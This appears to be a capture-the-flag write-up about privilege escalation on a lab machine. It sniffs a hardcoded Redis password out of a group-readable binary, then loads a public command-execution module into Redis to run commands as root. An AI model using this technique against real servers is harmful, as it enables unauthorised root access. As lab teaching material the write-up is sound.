## Enumeration
Land a new SSH session as dan_smith and check out the groups to see a new one: ```1003(sysadmin)```
Find files belonging to this group:
```bash
$ find / -type f -group sysadmin -ls 2>/dev/null
    17914   5836 -rwxr-x---   1 root     sysadmin  5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
```
It should be noted from running pspy earlier that there is indeed a redis server running on this box. This can be easily confirmed with netstat (port 6379 is the default for redis-server): 
```bash
$ netstat -alnp | grep -i listen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
[TRUNCATED]
```
## Redis password
Run the sysadmin file that was enumerated previously:
```bash
$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:6997
run_id:4016907403a8f29dbaade06534b9e560cad9bcd0
tcp_port:6379
uptime_in_seconds:36
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5526078
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```
The redis password is stored in ```/etc/redis/redis.conf``` which only root can read. This means this file must have the password hardcoded, and iff the password is hardcoded, it's possible that the sysadmin executable is submitting it to the server in clear text.
Download the sysadmin file to the attacking machine and start up Wire shark and redis server. Make sure that redis is configured to require a password. Use wireshark to begin listening on the loop back interface, then run the executable. Wireshark will see some traffic which reveals what appears to be a base64 encoded string...
![[Pasted image 20221022153519.png]]
Try that weird base64 as a password? 
```bash
$ redis-cli -a 'F2WHqJUz2WEz=Gqq'                            
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> info                                                                                                                                          
# Server                                                                       
redis_version:6.0.15                                                           
redis_git_sha1:00000000                                                                                                                                       
redis_git_dirty:0
[TRUNCATED]
```
## Command execution through modules
So there has to be a reason for jumping through all of those hoops right? After doing some googling, find a GitHub repository that claims there is system command execution through redis-server's module functionality: ```https://github.com/n0b0dyCN/RedisModules-ExecuteCommand``` 
![[Pasted image 20221022153836.png]]
Seems easy enough!
- Clone the repo
- Create the module file with make and then download it onto the victim box
- Move the file to ```/dev/shm``` and chmod it to make it executable 
```bash
$ redis-cli -a 'F2WHqJUz2WEz=Gqq'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> module load /dev/shm/module.so
OK
127.0.0.1:6379> module list
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
127.0.0.1:6379> system.exec 'id'
"uid=0(root) gid=0(root) groups=0(root)\n"
```
From here out it's pretty easy to get a reverse shell or just leak the root flag at ```/root/root.txt```